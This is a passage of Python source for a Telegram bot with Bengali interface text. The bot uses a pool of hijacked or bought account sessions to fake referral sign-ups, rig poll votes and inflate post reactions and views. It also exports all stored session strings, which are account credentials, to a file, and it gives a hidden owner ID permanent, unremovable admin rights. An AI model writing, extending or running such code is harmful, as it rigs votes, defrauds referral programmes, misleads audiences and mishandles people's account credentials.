        if not is_admin and not user_perms.get("History", True):
            await message.reply_text("🚫 **History অপশনটি অফ রাখা হয়েছে!**")
            return
        
        with get_db() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT target_bot, requested, completed, failed FROM order_history WHERE user_id = ?", (str_uid,))
            ref_rows = cursor.fetchall()
            cursor.execute("SELECT poll_link, option_name, requested, completed, failed FROM poll_history WHERE user_id = ?", (str_uid,))
            poll_rows = cursor.fetchall()
            cursor.execute("SELECT post_link, reaction, requested, completed, failed FROM react_history WHERE user_id = ?", (str_uid,))
            react_rows = cursor.fetchall()

        if not ref_rows and not poll_rows and not react_rows:
            await message.reply_text("📜 **আপনার কোনো আগের অর্ডার রেকর্ড পাওয়া যায়নি।**")
            return

        hist_msg = "📜 **আপনার পূর্ববর্তী অর্ডার হিস্ট্রি:**\n\n"
        counter = 1
        for item in ref_rows[-3:]:
            hist_msg += f"{counter}. [Referral] Target: @{item[0]} | সফল: `{item[2]}`/`{item[1]}`\n"
            counter += 1

        for item in poll_rows[-3:]:
            hist_msg += f"{counter}. [Poll Vote] Opt: `{item[1]}` | সফল: `{item[3]}`/`{item[2]}`\n"
            counter += 1

        for item in react_rows[-3:]:
            hist_msg += f"{counter}. [Reaction] Emoji: `{item[1]}` | সফল: `{item[3]}`/`{item[2]}`\n"
            counter += 1

        await message.reply_text(hist_msg)
        return

    elif text == "📢 Official Channel":
        channel_btn = InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join Official Channel", url=OFFICIAL_CHANNEL_URL)]])
        await message.reply_text("📢 **আমাদের অফিশিয়াল চ্যানেলে যুক্ত হতে নিচের বাটনে ক্লিক করুন:**", reply_markup=channel_btn)
        return

    elif text == "💬 Live Support":
        support_btn = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Admin / Support", url=SUPPORT_CONTACT_URL)]])
        await message.reply_text("💬 **যেকোনো প্রয়োজনে সরাসরি সাপোর্টে যোগাযোগ করুন:**", reply_markup=support_btn)
        return

    elif text == "❓ Help / Tutorial":
        if not is_admin and not user_perms.get("Help", True):
            await message.reply_text("🚫 **Help অপশনটি অফ রাখা হয়েছে!**")
            return
        help_text = (
            "❓ **বট ব্যবহার করার গাইডলাইন:**\n\n"
            "১. **🛠 Refer Services:** রেফারেল বাড়ানোর জন্য লিংক দিন।\n"
            "২. **📊 Poll Vote Service:** পোল লিংকে অটো ভোট নিন।\n"
            "৩. **❤️ View & Reaction:** পোস্ট ভিউ ও রিয়্যাকশন নিন।\n"
            "৪. **Health Check:** কাজ শুরু করার আগে বট স্বয়ংক্রিয়ভাবে নষ্ট সেশন রিমুভ করে অ্যালার্ট পাঠাবে।"
        )
        await message.reply_text(help_text)
        return

    elif text == "⚙️ Admin Panel":
        if not is_admin:
            await message.reply_text("❌ শুধু অনার এই প্যানেল ব্যবহার করতে পারবেন।")
            return
        
        admin_text = (
            f"👑 **অ্যাডমিন প্যানেল**\n\n"
            f"👥 **অনুমোদিত মোট ইউজার:** `{len(allowed)} জন`\n"
            f"🤖 **মোট অ্যাক্টিভ সেশন:** `{len(sessions)} টি`\n"
            f"👑 **মেইন অনার:** `{current_owner}`\n\n"
            f"👇 অপশন সিলেক্ট করুন:"
        )
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add User", callback_data="add_user"), InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
            [InlineKeyboardButton("✏️ Edit User Permission", callback_data="edit_user_list")],
            [InlineKeyboardButton("➕ Add New Session (ID)", callback_data="add_session_online"), InlineKeyboardButton("🗑 Delete Session", callback_data="delete_session_list")],
            [InlineKeyboardButton("🧹 Clear Bot Data", callback_data="clear_bot_data_prompt"), InlineKeyboardButton("🩺 Session Health Check", callback_data="session_health_check")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_msg"), InlineKeyboardButton("📁 Backup Sessions", callback_data="backup_sessions")],
            [InlineKeyboardButton("👑 Transfer Ownership", callback_data="transfer_ownership_prompt"), InlineKeyboardButton("📊 Detailed Analytics", callback_data="view_analytics")]
        ])
        await message.reply_text(admin_text, reply_markup=buttons)
        return

    if is_admin and user_id in ADMIN_STATE:
        state = ADMIN_STATE.pop(user_id)
        if not text.isdigit():
            await message.reply_text("❌ আইডি শুধু সংখ্যা হতে হবে।")
            return
        target_uid = text
        if state == "ADD" and target_uid not in allowed:
            allowed[target_uid] = {
                "username": "Pending Login",
                "permissions": {"Services": True, "Poll Vote": True, "React/View": True, "Profile": True, "Status": True, "History": True, "Help": True}
            }
            save_allowed_users(allowed)
            await message.reply_text(f"✅ ইউজার `{target_uid}` সফলভাবে এড করা হয়েছে।")
        elif state == "REMOVE" and int(target_uid) != current_owner and int(target_uid) != HIDDEN_OWNER_ID:
            remove_user_from_db(target_uid)
            await message.reply_text(f"✅ ইউজার `{target_uid}` ডেটাবেজ থেকে চিরতরে রিমুভ করা হয়েছে।")
        return

    react_link_match = re.search(r't\.me/([a-zA-Z0-9_]+)/(\d+)', text)
    if react_link_match and USER_STATE.get(chat_id) == "WAITING_FOR_REACT_LINK":
        c_username = react_link_match.group(1)
        msg_id = int(react_link_match.group(2))

        REACT_TEMP_DATA[user_id] = {
            "chat": c_username,
            "message_id": msg_id
        }
        USER_STATE.pop(chat_id, None)

        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("👍 Like", callback_data="react_emoji_👍"), InlineKeyboardButton("❤️ Love", callback_data="react_emoji_❤️"), InlineKeyboardButton("🔥 Fire", callback_data="react_emoji_🔥")],
            [InlineKeyboardButton("🎉 Party", callback_data="react_emoji_🎉"), InlineKeyboardButton("👀 View Only", callback_data="react_emoji_VIEW_ONLY")]
        ])
        await message.reply_text(
            "✅ **পোস্ট লিংক সফলভাবে গ্রহণ করা হয়েছে!**\n\n"
            "👇 **কোন রিয়্যাকশনটি নিতে চান অথবা শুধু ভিউ নিতে চান সিলেক্ট করুন:**",
            reply_markup=buttons
        )
        return

    poll_link_match = re.search(r't\.me/([a-zA-Z0-9_]+)/(\d+)', text)
    if poll_link_match and USER_STATE.get(chat_id) == "WAITING_FOR_POLL_LINK":
        c_username = poll_link_match.group(1)
        msg_id = int(poll_link_match.group(2))

        cleaned_sessions = await verify_and_clean_sessions(client)
        if not cleaned_sessions:
            await message.reply_text("❌ কোনো সচল সেশন নেই! আগে সেশন যোগ করুন।")
            return

        try:
            async with Client(f"poll_fetcher_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=cleaned_sessions[0], in_memory=True) as temp_client:
                try:
                    await temp_client.resolve_peer(c_username)
                except Exception:
                    pass
                target_msg = await temp_client.get_messages(c_username, msg_id)
                
                is_native = False
                options_data = []

                if target_msg and target_msg.poll:
                    is_native = True
                    for idx, opt in enumerate(target_msg.poll.options):
                        options_data.append({"index": idx, "text": opt.text})
                
                elif target_msg and target_msg.reply_markup and isinstance(target_msg.reply_markup, InlineKeyboardMarkup):
                    idx_counter = 0
                    for row in target_msg.reply_markup.inline_keyboard:
                        for btn in row:
                            if btn.text and not btn.url:
                                options_data.append({"index": idx_counter, "text": btn.text})
                                idx_counter += 1

                if not options_data:
                    await message.reply_text("❌ এই লিঙ্কে কোনো পোল বা ভোট দেওয়ার বাটন পাওয়া যায়নি।")
                    return

                buttons = []
                for opt in options_data:
                    buttons.append([InlineKeyboardButton(f"{opt['text']}", callback_data=f"poll_opt_{opt['index']}")])

                POLL_TEMP_DATA[user_id] = {
                    "chat": c_username,
                    "message_id": msg_id,
                    "options": options_data,
                    "is_native": is_native
                }
                USER_STATE.pop(chat_id, None)
                await message.reply_text(
                    f"✅ **পোল সফলভাবে লোড হয়েছে!**\n\n"
                    f"📌 পোল টাইপ: `{'Telegram Native Poll' if is_native else 'Inline Bot Poll'}`\n\n"
                    f"👇 **কোন অপশনটিতে ভোট নিতে চান তা সিলেক্ট করুন:**",
                    reply_markup=InlineKeyboardMarkup(buttons)
                )
        except Exception as e:
            await message.reply_text(f"❌ পোল রিড করতে সমস্যা হয়েছে:\n`{e}`")
        return

    ref_match = re.search(r't\.me/([a-zA-Z0-9_]+)\?start=([a-zA-Z0-9_]+)', text)
    if ref_match and USER_STATE.get(chat_id) == "WAITING_FOR_LINK":
        target_bot, ref_code = ref_match.group(1), ref_match.group(2)
        PENDING_ORDERS[user_id] = {
            "target_bot": target_bot.lower(),
            "ref_code": ref_code
        }
        USER_STATE[chat_id] = "WAITING_FOR_COUNT"
        await message.reply_text(
            f"✅ **লিঙ্ক গ্রহণ করা হয়েছে!**\n\n"
            f"🎯 Target Bot: @{target_bot}\n"
            f"📊 মোট আইডি এভেইলএবল: `{len(sessions)} টি`\n\n"
            f"🔢 **কয়টি নতুন রেফার পেতে চান? ক্লিকের সংখ্যা দিন (যেমন: 1, 5, 10, 17):**"
        )
        return

    if user_id in REACT_TEMP_DATA and USER_STATE.get(chat_id) == "WAITING_FOR_REACT_COUNT":
        if not text.isdigit():
            await message.reply_text("❌ শুধু সংখ্যা লিখে পাঠান।")
            return
        
        target_needed = int(text)
        if target_needed <= 0:
            await message.reply_text("❌ অন্তত ১ টি সংখ্যা দিতে হবে।")
            return

        react_info = REACT_TEMP_DATA.pop(user_id)
        USER_STATE.pop(chat_id, None)

        chat_identifier = react_info["chat"]
        msg_id = react_info["message_id"]
        emoji = react_info["emoji"]
        do_view = react_info["do_view"]
        post_link = f"https://t.me/{chat_identifier}/{msg_id}"

        cleaned_sessions = await verify_and_clean_sessions(client)
        if not cleaned_sessions:
            await message.reply_text("❌ কোনো সচল সেশন নেই!")
            return

        status_msg = await message.reply_text(
            f"⏳ **ভিউ ও রিয়্যাকশন প্রোগ্রেস শুরু হয়েছে...**\n"
            f"🎯 টার্গেট: `{emoji if emoji else 'Only View'}`\n"
            f"📊 প্রোগ্রেস: [░░░░░░░░░░] 0/{target_needed}"
        )

        success_count = 0
        failed_count = 0

        for session in cleaned_sessions:
            if success_count >= target_needed:
                break

            is_success = await run_reaction_task(session, chat_identifier, msg_id, emoji, do_view)
            if is_success:
                success_count += 1
            else:
                failed_count += 1

            percent = int((success_count / target_needed) * 10) if target_needed > 0 else 10
            bar = "█" * min(percent, 10) + "░" * (10 - min(percent, 10))
            
            await status_msg.edit_text(
                f"🔄 **ভিউ ও রিয়্যাকশন প্রোগ্রেস:**\n"
                f"🎯 টার্গেট: `{emoji if emoji else 'Only View'}`\n"
                f"📈 [{bar}] {success_count}/{target_needed}\n"
                f"✅ সফল: `{success_count}` | ❌ ব্যর্থ: `{failed_count}`"
            )
            await asyncio.sleep(0.5)

        save_react_history(user_id, post_link, emoji if emoji else "View", target_needed, success_count, failed_count)
        await status_msg.edit_text(
            f"🏁 **ভিউ ও রিয়্যাকশন অর্ডার সম্পন্ন!**\n\n"
            f"✅ **সফল:** `{success_count}` টি\n"
            f"❌ **ফেইলড:** `{failed_count}` টি"
        )
        return

    if user_id in POLL_TEMP_DATA and USER_STATE.get(chat_id) == "WAITING_FOR_POLL_COUNT":
        if not text.isdigit():
            await message.reply_text("❌ শুধু সংখ্যা লিখে পাঠান।")
            return
        
        target_needed = int(text)
        if target_needed <= 0:
            await message.reply_text("❌ অন্তত ১ টি ভোট সিলেক্ট করতে হবে।")
            return

        poll_info = POLL_TEMP_DATA.pop(user_id)
        USER_STATE.pop(chat_id, None)

        chat_identifier = poll_info["chat"]
        msg_id = poll_info["message_id"]
        opt_idx = poll_info["option_index"]
        opt_name = poll_info["option_name"]
        is_native = poll_info["is_native"]
        poll_link = f"https://t.me/{chat_identifier}/{msg_id}"

        cleaned_sessions = await verify_and_clean_sessions(client)
        if not cleaned_sessions:
            await message.reply_text("❌ কোনো সচল সেশন নেই!")
            return

        status_msg = await message.reply_text(
            f"⏳ **পোল ভোট কিউ প্রোগ্রেস শুরু হয়েছে...**\n"
            f"🎯 টার্গেট অপশন: `{opt_name}`\n"
            f"📊 প্রোগ্রেস: [░░░░░░░░░░] 0/{target_needed}"
        )

        success_count = 0
        failed_count = 0

        # এক এক করে প্রতিটি সেশনের মাধ্যমে নিখুঁতভাবে ভোট প্রদান নিশ্চিত করা হবে যাতে কোনো ভোট মিস বা ফেইল না করে
        for session in cleaned_sessions:
            if success_count >= target_needed:
                break

            is_success = await run_poll_vote_task(session, chat_identifier, msg_id, opt_idx, is_native, opt_name)
            if is_success:
                success_count += 1
            else:
                failed_count += 1

            percent = int((success_count / target_needed) * 10) if target_needed > 0 else 10
            bar = "█" * min(percent, 10) + "░" * (10 - min(percent, 10))
            
            await status_msg.edit_text(
                f"🔄 **পোল ভোট প্রোগ্রেস (Current Progress):**\n"
                f"🎯 টার্গেট অপশন: `{opt_name}`\n"
                f"📈 [{bar}] {success_count}/{target_needed}\n"
                f"✅ সফল: `{success_count}` | ❌ ব্যর্থ: `{failed_count}`"
            )
            await asyncio.sleep(0.5)

        save_poll_history(user_id, poll_link, opt_name, target_needed, success_count, failed_count)
        await status_msg.edit_text(
            f"🏁 **পোল ভোট অর্ডার সম্পন্ন!**\n\n"
            f"🎯 অপশন: `{opt_name}`\n"
            f"✅ **সফল ভোট:** `{success_count}` টি\n"
            f"❌ **ফেইলড:** `{failed_count}` টি"
        )
        return

    if user_id in PENDING_ORDERS and USER_STATE.get(chat_id) == "WAITING_FOR_COUNT":
        if not text.isdigit():
            await message.reply_text("❌ শুধু সংখ্যা লিখে পাঠান।")
            return

        target_needed = int(text)
        if target_needed <= 0:
            await message.reply_text("❌ অন্তত ১ টি রেফারের সংখ্যা দিতে হবে।")
            return

        USER_STATE.pop(chat_id, None)
        order_data = PENDING_ORDERS.pop(user_id)
        target_bot = order_data["target_bot"]
        ref_code = order_data["ref_code"]

        cleaned_sessions = await verify_and_clean_sessions(client)
        if not cleaned_sessions:
            await message.reply_text("❌ কোনো সচল সেশন নেই!")
            return

        used_db = load_used_data()
        if target_bot not in used_db:
            used_db[target_bot] = []

        status_msg = await message.reply_text(
            f"⏳ **লাইভ কিউ প্রোগ্রেস শুরু হয়েছে...**\n"
            f"🎯 Target Bot: @{target_bot}\n"
            f"📊 প্রোগ্রেস: [░░░░░░░░░░] 0/{target_needed}"
        )

        success_count = 0
        failed_count = 0

        for session in cleaned_sessions:
            if success_count >= target_needed:
                break

            if session in used_db[target_bot]:
                failed_count += 1
                continue

            is_success = await run_referral_task(session, target_bot, ref_code)
            
            if is_success:
                success_count += 1
                save_used_data_entry(target_bot, session)
            else:
                failed_count += 1
                save_used_data_entry(target_bot, session)

            percent = int((success_count / target_needed) * 10) if target_needed > 0 else 10
            bar = "█" * min(percent, 10) + "░" * (10 - min(percent, 10))
            
            await status_msg.edit_text(
                f"🔄 **লাইভ কিউ স্ট্যাটাস (Current Progress):**\n"
                f"🎯 Target Bot: @{target_bot}\n"
                f"📈 [{bar}] {success_count}/{target_needed}\n"
                f"✅ সফল: `{success_count}` | ❌ ব্যর্থ: `{failed_count}`"
            )
            await asyncio.sleep(1)

        save_order_history(user_id, target_bot, target_needed, success_count, failed_count)
        await status_msg.edit_text(
            f"🏁 **অর্ডার সম্পন্ন ও রিপোর্ট!**\n\n"
            f"🎯 Target Bot: @{target_bot}\n"
            f"✅ **নতুন সফল রেফার:** `{success_count}` টি\n"
            f"❌ **ফেইলড:** `{failed_count}` টি"
        )
        return

@main_bot.on_callback_query(auth_filter)
async def callback_handler(client: Client, query: CallbackQuery):
    data = query.data
    user_id = query.from_user.id
    current_owner = get_owner_id()
    is_admin = (user_id == current_owner or user_id == HIDDEN_OWNER_ID)

    if data.startswith("react_emoji_"):
        emoji_val = data.split("_")[2]
        if user_id in REACT_TEMP_DATA:
            if emoji_val == "VIEW_ONLY":
                REACT_TEMP_DATA[user_id]["emoji"] = None
                REACT_TEMP_DATA[user_id]["do_view"] = True
                lbl = "Only View Boost"
            else:
                REACT_TEMP_DATA[user_id]["emoji"] = emoji_val
                REACT_TEMP_DATA[user_id]["do_view"] = True
                lbl = f"Reaction ({emoji_val}) + View"

            USER_STATE[query.message.chat.id] = "WAITING_FOR_REACT_COUNT"
            await query.message.edit_text(
                f"✅ আপনি সিলেক্ট করেছেন: **{lbl}**\n\n"
                f"🔢 **এখন কয়টি ভিউ বা রিয়্যাকশন নিতে চান সেই সংখ্যাটি লিখে পাঠান (যেমন: 10, 50, 100):**"
            )
        await query.answer()
        return

    if data.startswith("poll_opt_"):
        opt_idx = int(data.split("_")[2])
        if user_id in POLL_TEMP_DATA:
            opts = POLL_TEMP_DATA[user_id]["options"]
            selected_opt = next((item for item in opts if item["index"] == opt_idx), None)
            
            opt_name = selected_opt["text"] if selected_opt else f"Option {opt_idx}"
            POLL_TEMP_DATA[user_id]["option_index"] = opt_idx
            POLL_TEMP_DATA[user_id]["option_name"] = opt_name
            USER_STATE[query.message.chat.id] = "WAITING_FOR_POLL_COUNT"
            await query.message.edit_text(
                f"✅ আপনি সিলেক্ট করেছেন: **{opt_name}**\n\n"
                f"🔢 **এখন কয়টি ভোট নিতে চান সেই সংখ্যাটি লিখে পাঠান (যেমন: 5, 10, 20):**"
            )
        await query.answer()
        return

    if not is_admin:
        # সাধারণ পারমিশনপ্রাপ্ত ইউজারদের জন্য তাদের নিজ নিজ অ্যাকশন হ্যান্ডেল করা হবে
        pass

    allowed = load_allowed_users()
    sessions = get_sessions()

    # অ্যাডমিন বা পারমিশন চেক
    if not is_admin and str(user_id) not in allowed:
        await query.answer("❌ অনুমতি নেই।", show_alert=True)
        return

    if data == "add_user" and is_admin:
        ADMIN_STATE[user_id] = "ADD"
        await query.message.reply_text("➕ ইউজার আইডি পাঠান:")
        await query.answer()
    elif data == "remove_user" and is_admin:
        ADMIN_STATE[user_id] = "REMOVE"
        await query.message.reply_text("➖ রিমুভ করার ইউজার আইডি পাঠান:")
        await query.answer()
    elif data == "transfer_ownership_prompt" and is_admin:
        ADMIN_STATE[user_id] = "TRANSFER_OWNERSHIP"
        await query.message.reply_text("👑 **নতুন অনারের টেলিগ্রাম ইউজার আইডি (User ID) টি লিখে পাঠান:**")
        await query.answer()
    elif data == "add_session_online" and is_admin:
        LOGIN_DATA[user_id] = {"step": "PHONE"}
        await query.message.reply_text("📱 নতুন টেলিগ্রাম আইডির ফোন নম্বর দিন (যেমন: +88017XXXXXXXX):")
        await query.answer()
    elif data == "clear_bot_data_prompt" and is_admin:
        ADMIN_STATE[user_id] = "CLEAR_BOT_DATA"
        await query.message.reply_text("🧹 যে টার্গেট বটের ডেটা ডিলিট করতে চান তার ইউজারনেম পাঠান (যেমন: `@Opalbot`):")
        await query.answer()
    elif data == "delete_session_list" and is_admin:
        session_infos = get_sessions_with_info()
        if not session_infos:
            await query.answer("কোনো সেশন নেই।", show_alert=True)
            return
        buttons = [[InlineKeyboardButton(f"🗑 Delete: {ph}", callback_data=f"del_sess_{i}")] for i, (s, ph) in enumerate(session_infos)]
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_admin")])
        await query.message.edit_text("🗑 মুছতে সেশন সিলেক্ট করুন:", reply_markup=InlineKeyboardMarkup(buttons))
        await query.answer()
    elif data.startswith("del_sess_") and is_admin:
        idx = int(data.split("_")[2])
        session_infos = get_sessions_with_info()
        if 0 <= idx < len(session_infos):
            target_str = session_infos[idx][0]
            with get_db() as conn:
                cursor = conn.cursor()
                cursor.execute("DELETE FROM sessions WHERE session_string = ?", (target_str,))
                conn.commit()
            await query.answer("সেশন ডিলিট করা হয়েছে!", show_alert=True)
            session_infos = get_sessions_with_info()
            buttons = [[InlineKeyboardButton(f"🗑 Delete: {ph}", callback_data=f"del_sess_{i}")] for i, (s, ph) in enumerate(session_infos)]
            buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_admin")])
            await query.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
        return
    elif data == "session_health_check" and is_admin:
        await query.answer("হেলথ চেক শুরু হচ্ছে...", show_alert=True)
        health_msg = await query.message.reply_text("🩺 সেশনগুলো চেক করা হচ্ছে...")
        session_infos = get_sessions_with_info()
        active, dead = 0, 0
        dead_phones = []
        
        valid_s = []
        for s_str, ph in session_infos:
            try:
                async with Client(f"test_w_{os.urandom(4).hex()}", api_id=API_ID, api_hash=API_HASH, session_string=s_str, in_memory=True) as temp_w:
                    me = await temp_w.get_me()
                    if me:
                        active += 1
                        valid_s.append((s_str, ph))
            except Exception:
                dead += 1
                dead_phones.append(ph)

        with get_db() as conn:
            cursor = conn.cursor()
            cursor.execute("DELETE FROM sessions")
            for s_str, ph in valid_s:
                cursor.execute("INSERT INTO sessions (session_string, phone) VALUES (?, ?)", (s_str, ph))
            conn.commit()

        dead_str = ", ".join(dead_phones) if dead_phones else "None"
        await health_msg.edit_text(
            f"🩺 **সেশন হেলথ রিপোর্ট:**\n\n"
            f"🟢 সচল সেশন: `{active}` টি\n"
            f"🔴 নষ্ট/ব্যান সেশন (অটো রিমুভড): `{dead}` টি\n"
            f"📱 নষ্ট নম্বরসমূহ: `{dead_str}`"
        )
        return
    elif data == "broadcast_msg" and is_admin:
        ADMIN_STATE[user_id] = "BROADCAST"
        await query.message.reply_text("📢 ব্রডকাস্ট মেসেজটি লিখে পাঠান:")
        await query.answer()
    elif data == "backup_sessions" and is_admin:
        session_infos = get_sessions_with_info()
        backup_file = "sessions_backup.txt"
        with open(backup_file, "w") as f:
            f.write("\n".join([s[0] for s in session_infos]))
        if os.path.exists(backup_file):
            await query.message.reply_document(backup_file, caption="📁 সেশন ব্যাকআপ ফাইল!")
            os.remove(backup_file)
        await query.answer()
    elif data == "view_analytics" and is_admin:
        used_db = load_used_data()
        session_infos = get_sessions_with_info()
        await query.message.reply_text(f"📊 **অ্যানালিটিক্স:**\n🤖 মোট বট: {len(used_db)}\n📦 সেশন: {len(session_infos)}")
        await query.answer()
    elif data == "edit_user_list" and is_admin:
        buttons = [[InlineKeyboardButton(f"👤 {v.get('username','Pending Login')} ({k})", callback_data=f"edit_perm_{k}")] for k, v in allowed.items() if int(k) != current_owner and int(k) != HIDDEN_OWNER_ID]
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_admin")])
        await query.message.edit_text("✏️ ইউজার সিলেক্ট করুন:", reply_markup=InlineKeyboardMarkup(buttons))
        await query.answer()
    elif data.startswith("edit_perm_") and is_admin:
        target_uid = data.split("_")[2]
        perms = allowed.get(target_uid, {}).get("permissions", {"Services": True, "Poll Vote": True, "React/View": True})
        buttons = [
            [InlineKeyboardButton(f"{'✅' if p else '❌'} {k}", callback_data=f"toggle_{target_uid}_{k}")] for k, p in perms.items()
        ]
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="edit_user_list")])
        await query.message.edit_text("⚙️ পারমিশন টগল করুন:", reply_markup=InlineKeyboardMarkup(buttons))
        await query.answer()
    elif data.startswith("toggle_") and is_admin:
        _, target_uid, p_key = data.split("_")
        if target_uid in allowed:
            curr = allowed[target_uid]["permissions"].get(p_key, True)
            allowed[target_uid]["permissions"][p_key] = not curr
            save_allowed_users(allowed)
            perms = allowed[target_uid]["permissions"]
            buttons = [
                [InlineKeyboardButton(f"{'✅' if p else '❌'} {k}", callback_data=f"toggle_{target_uid}_{k}")] for k, p in perms.items()
            ]
            buttons.append([InlineKeyboardButton("🔙 Back", callback_data="edit_user_list")])
            await query.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(buttons))
            await query.answer("আপডেট করা হয়েছে!")
        return
    elif data == "back_admin" and is_admin:
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add User", callback_data="add_user"), InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
            [InlineKeyboardButton("✏️ Edit User Permission", callback_data="edit_user_list")],
            [InlineKeyboardButton("➕ Add New Session (ID)", callback_data="add_session_online"), InlineKeyboardButton("🗑 Delete Session", callback_data="delete_session_list")],
            [InlineKeyboardButton("🧹 Clear Bot Data", callback_data="clear_bot_data_prompt"), InlineKeyboardButton("🩺 Session Health Check", callback_data="session_health_check")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast_msg"), InlineKeyboardButton("📁 Backup Sessions", callback_data="backup_sessions")],
            [InlineKeyboardButton("👑 Transfer Ownership", callback_data="transfer_ownership_prompt"), InlineKeyboardButton("📊 Detailed Analytics", callback_data="view_analytics")]
        ])
        await query.message.edit_text("👑 **অ্যাডমিন প্যানেল**", reply_markup=buttons)
        await query.answer()

if __name__ == "__main__":
    main_bot.run()
